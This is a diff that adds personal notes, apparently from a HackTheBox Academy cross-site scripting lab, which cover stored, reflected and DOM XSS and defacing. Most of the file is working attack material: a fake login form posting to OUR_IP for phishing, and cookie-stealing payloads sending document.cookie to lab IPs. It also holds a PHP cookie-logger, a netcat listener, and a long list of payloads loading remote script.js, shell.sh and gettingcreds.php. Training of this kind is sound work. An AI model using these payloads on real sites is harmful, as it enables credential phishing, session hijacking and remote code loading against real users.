@@ -1,0 +1,332 @@
+=======================================================================================================
+-----------------------------------------
+|                                       |
+|             XSS TYPES                 |
+|                                       |
+-----------------------------------------
+
+Stored (Persistent) XSS:
+                                The most critical type of XSS, which occurs when user input is
+                                stored on the back-end database and then displayed upon retrieval
+                                (e.g., posts or comments).
+
+Reflected (Non-Persistent) XSS:	Occurs when user input is displayed on the page after being
+                                processed by the backend server, but without being stored
+                                (e.g., search result or error message)
+
+DOM-based XSS	Another (Non-Persistent): Occurs when user input is directly shown in the
+                                          browser and is completely processed on the client-side,
+                                          without reaching the back-end server (e.g., through
+                                          client-side HTTP parameters or anchor tags)
+
+=======================================================================================================
+-------------------------------------
+|                                   |
+|             STORED XSS            |
+|                                   |
+-------------------------------------
+
+<script>alert(window.origin)</script>
+
+<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
+</ul></ul>
+
+
+=======================================================================================================
+------------------------------------
+|                                  |
+|            REFLECTED XSS         |
+|                                  |
+------------------------------------
+
+<div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div></ul>
+
+<script>alert(window.origin)</script>
+
+ We can check this through the Firefox Developer Tools by clicking [CTRL+I] and selecting the Network tab. Then, we can put our test payload again and click Add to send it:
+ index.php?task=test
+
+=======================================================================================================
+-------------------------------
+|                             |
+|          DOM XSS            |
+|                             |
+-------------------------------
+
+
+Document Object Model (DOM).
+
+The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above
+
+, the Sink is the function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack
+Some of the commonly used JavaScript functions to write to DOM objects are:
+
+- document.write()
+- DOM.innerHTML
+- DOM.outerHTML
+
+ some of the jQuery library functions that write to DOM objects are:
+
+- add()
+- after()
+- append()
+
+
+we see that the page uses the innerHTML function to write the task variable in the todo DOM:
+
+document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
+
+
+PAYLOADS TO DOM:
+
+<img src="" onerror=alert(window.origin)>
+
+--------------------------------------------------------------------------------------
+:::::::::::::::XSS DISCOVERY::::::::::::::::::
+
+TOOLS:
+- xss strike
+- brute xss
+- xsser
+
+wordlistsS:
+-payload all the things
+-payloadbox
+
+-----------------------------------------------------------------------------------------
+DEFACING:
+
+Three HTML elements are usually utilized to change the main look of a web page:
+
+Background Color document.body.style.background
+Background document.body.background
+Page Title document.title
+Page Text DOM.innerHTML
+
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+<script>document.title = 'HackTheBox Academy'</script>
+document.getElementById("todo").innerHTML = "New Text"
+$("#todo").html('New Text');
+document.getElementsByTagName('body')[0].innerHTML = "New Text"
+---------------------------
+<center>
+    <h1 style="color: white">Cyber Security Training</h1>
+    <p style="color: white">by 
+        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
+    </p>
+</center>
+----------------------------
+<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
+----------------------------
+<div></div><ul class="list-unstyled" id="todo"><ul>
+<script>document.body.style.background = "#141d2b"</script>
+</ul><ul><script>document.title = 'HackTheBox Academy'</script>
+</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
+</ul></ul>
+---------------------------
+======================================================================================================
+PHSHING
+
+LOGIN FORM INJECTION:
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+
+
+
+
+<div>
+<h3>Please login to continue</h3>
+<input type="text" placeholder="Username">
+<input type="text" placeholder="Password">
+<input type="submit" value="Login">
+<br><br>
+</div>
+
+
+
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+
+
+<form role="form" action="index.php" method="GET" id='urlform'>
+    <input type="text" placeholder="Image URL" name="url">
+</form>
+
+
+document.getElementById('urlform').remove();
+
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
+
+sudo nc -lvnp 80
+
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+nvim index.php #at this step we wrote our index.php file
+sudo php -S 0.0.0.0:80
+
+cat creds.txt
+
+======================================================================================================
+
+SESSION HIJACKING
+
+Some potential examples include:
+
+- Contact Forms
+- Reviews
+- User Details
+- Support Tickets
+- HTTP User-Agent header
+
+- How can we know which specific field is vulnerable? 
+  Since any of the fields may execute our code, we can't know which of them did.
+
+- How can we know what XSS payload to use? Since the page may be vulnerable, but the payload may not work?
+
+
+<script src="http://OUR_IP/script.js"></script>
+
+<script src="http://OUR_IP/username"></script>
+
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+
+mkdir /tmp/tmpserver
+ cd /tmp/tmpserver
+  sudo php -S 0.0.0.0:80
+
+<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
+<script src=http://OUR_IP/username></script> #this goes inside the username field
+...SNIP...
+
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+
+new Image().src='http://OUR_IP/index.php?c='+document.cookie
+
+<script src=http://OUR_IP/script.js></script>
+
+--------------------------------------------------------
+
+payload:
+
+"><script src=http://[OUR IP AND PORT USED AS THE PHP LISTENER SERVER]/script.js></script>
+
+--------------------------------------------------------
+script.js
+
+new Image().src='http://10.10.14.27:8080/index.php?c='+document.cookie
+
+---------------------------------------------------------
+INDEX.PHP
+
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['WRITE HERE THE VICTIM IP']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+-----------------------------------------------------------
+send the request, comment whatever
+-test each search field or comment area
+-test with and without "save my email, name etc" OPTION
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+=======================================================================================================
+-------------------------------
+|                             |
+|           PAYLOADS          |  
+|                             |
+-------------------------------
+
+/index.php?url=document.write(%27<h3>Please%20login%20to%20continue</h3><form%20action=http://10.10.15.108><input%20type="username"%20name="username"%20placeholder="Username"><input%20type="password"%20name="password"%20placeholder="Password"><input%20type="submit"%20name="submit"%20value="Login"></form>);document.getElementById(%27urlform%27).remove();
+
+
+<img src="" onerror=alert(window.origin)>
+
+<script>document.body.style.background = "#141d2b"</script>
+
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+
+<script>document.title = 'HackTheBox Academy'</script>
+
+<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
+
+<script>document.getElementById('urlform').remove();</script>
+
+<script src="http://10.10.15.209:80/script.js"></script>
+
+<script>new Image().src='http://10.10.15.209:80/index.php?c='+document.cookie</script>
+
+http://0.0.0.0/index.php?
+
+<script src="http://10.10.15.209:80/index.php"></script>
+
+<script src="http://10.10.15.209:80/index.php"></script>
+
+'><script src=http://OUR_IP></script>
+
+"><script src=http://OUR_IP></script>
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.209:80/script.js\';document.body.appendChild(a)')
+
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.209:80/script.js");a.send();</script>
+
+<script>$.getScript("http://10.10.15.108:80/script.js")</script>
+
+"><script src=http://10.10.15.209:80/script.js></script>
+
+'><script src=http:/10.10.15.209:80/script.js/></script>
+
+'<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>'
+
+'><script src=http://10.10.14.24:4444/shell.sh></script>'
+
+><script src=http://10.10.14.24:4444/shell.sh></script>
+
+"><script src=http://10.10.14.24:4444/shell.sh></script>
+
+========================================================================
+<script src=http://10.10.14.24:4444/gettingcreds.php></script>
+
+"><script src=http://10.10.14.24:4444/gettingcreds.php></script>
+
+<script>new Image().src='http://10.10.14.24:4444/gettingcreds.php'</script>
+
+'<script>new Image().src='http://10.10.14.24:4444/gettingcreds.php'</script>'
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.24:4444/gettingcreds.php\';document.body.appendChild(a)')
+
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.24:4444/gettingcreds.php");a.send();</script>
+
+'<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.24:4444/gettingcreds.php");a.send();</script>'
+
+"<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.24:4444/gettingcreds.php");a.send();</script>"
+
+
